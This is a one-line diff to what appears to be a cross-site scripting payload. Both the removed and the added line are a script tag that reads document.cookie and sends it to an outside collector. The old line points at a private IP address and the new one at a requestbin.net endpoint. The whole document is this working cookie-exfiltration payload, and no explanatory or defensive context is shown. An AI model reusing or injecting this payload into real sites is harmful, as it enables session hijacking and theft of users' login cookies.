@@ -1,1 +1,1 @@
-<script>new Image().src="http://192.168.1.16/b.php?c="+document.cookie;</script>
+<script>new Image().src="http://requestbin.net/r/11ti1yd4?c="+document.cookie;</script>
